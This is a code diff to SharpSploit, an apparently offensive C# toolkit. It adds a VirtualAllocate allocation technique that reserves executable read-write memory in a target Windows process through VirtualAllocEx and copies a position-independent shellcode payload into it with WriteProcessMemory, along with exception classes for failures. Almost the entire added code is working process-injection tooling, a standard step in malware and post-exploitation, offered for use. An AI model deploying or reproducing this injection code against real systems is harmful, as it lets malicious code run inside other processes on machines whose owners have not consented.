@@ -287,4 +287,127 @@ namespace SharpSploit.Execution.Injection
             return DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
         }
     }
+
+    /// <summary>
+    /// Allocates a payload to a target process using VirtualAllocateEx and WriteProcessMemory
+    /// </summary>
+    public class VirtualAllocate : AllocationTechnique
+    {
+        // Publically accessible options
+
+        public Win32.Kernel32.AllocationType allocationType = (Win32.Kernel32.AllocationType.Reserve | Win32.Kernel32.AllocationType.Commit);
+        public Win32.Kernel32.MemoryProtection memoryProtection = Win32.Kernel32.MemoryProtection.ExecuteReadWrite;
+
+        /// <summary>
+        /// Default constructor.
+        /// </summary>
+        public VirtualAllocate()
+        {
+            DefineSupportedPayloadTypes();
+        }
+
+        /// <summary>
+        /// Constructor allowing options as arguments.
+        /// </summary>
+        public VirtualAllocate(
+            Win32.Kernel32.AllocationType alloctype = (Win32.Kernel32.AllocationType.Reserve | Win32.Kernel32.AllocationType.Commit),
+            Win32.Kernel32.MemoryProtection memprotect = Win32.Kernel32.MemoryProtection.ExecuteReadWrite)
+        {
+            DefineSupportedPayloadTypes();
+            allocationType = alloctype;
+            memoryProtection = memprotect;
+        }
+
+        /// <summary>
+        /// States whether the payload is supported.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        /// <param name="Payload">Payload that will be allocated.</param>
+        /// <returns></returns>
+        public override bool IsSupportedPayloadType(PayloadType Payload)
+        {
+            return supportedPayloads.Contains(Payload.GetType());
+        }
+
+        /// <summary>
+        /// Internal method for setting the supported payload types. Used in constructors.
+        /// Update when new types of payloads are added.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        internal override void DefineSupportedPayloadTypes()
+        {
+            //Defines the set of supported payload types.
+            supportedPayloads = new Type[] {
+                typeof(PICPayload)
+            };
+        }
+
+        /// <summary>
+        /// Allocate the payload to the target process. Handles unknown payload types.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        /// <param name="Payload">The payload to allocate to the target process.</param>
+        /// <param name="Process">The target process.</param>
+        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
+        public override IntPtr Allocate(PayloadType Payload, Process Process)
+        {
+            if (!IsSupportedPayloadType(Payload))
+            {
+                throw new PayloadTypeNotSupported(Payload.GetType());
+            }
+            return Allocate(Payload, Process, IntPtr.Zero);
+        }
+
+        /// <summary>
+        /// Allocate the payload in the target process via VirtualAllocEx + WriteProcessMemory
+        /// </summary>
+        /// <author>The Wover (@TheRealWover), aus (@aus)</author>
+        /// <param name="Payload">The PIC payload to allocate to the target process.</param>
+        /// <param name="Process">The target process.</param>
+        /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
+        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
+        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress)
+        {
+            // Get a convenient handle for the target process.
+            IntPtr procHandle = Process.Handle;
+
+            // Allocate some memory
+            IntPtr regionAddress = DynamicInvoke.Win32.VirtualAllocEx(procHandle, PreferredAddress, (uint)Payload.Payload.Length, allocationType, memoryProtection);
+
+            if (regionAddress == IntPtr.Zero)
+            {
+                throw new AllocationFailed(System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+            }
+
+            // Copy the shellcode to allocated memory
+            bool retVal = DynamicInvoke.Win32.WriteProcessMemory(procHandle, regionAddress, Payload.Payload, (Int32)Payload.Payload.Length, out IntPtr bytesWritten);
+
+            if (!retVal)
+            {
+                throw new MemoryWriteFailed(System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+            }
+
+            return regionAddress;
+        }
+    }
+
+    /// <summary>
+    /// Exception thrown when the payload memory fails to allocate
+    /// </summary>
+    public class AllocationFailed : Exception
+    {
+        public AllocationFailed() { }
+
+        public AllocationFailed(int error) : base(string.Format("Memory failed to allocate with system error code: {0}", error)) { }
+    }
+
+    /// <summary>
+    /// Exception thrown when the memory fails to write
+    /// </summary>
+    public class MemoryWriteFailed : Exception
+    {
+        public MemoryWriteFailed() { }
+
+        public MemoryWriteFailed(int error) : base(string.Format("Memory failed to write with system error code: {0}", error)) { }
+    }
 }
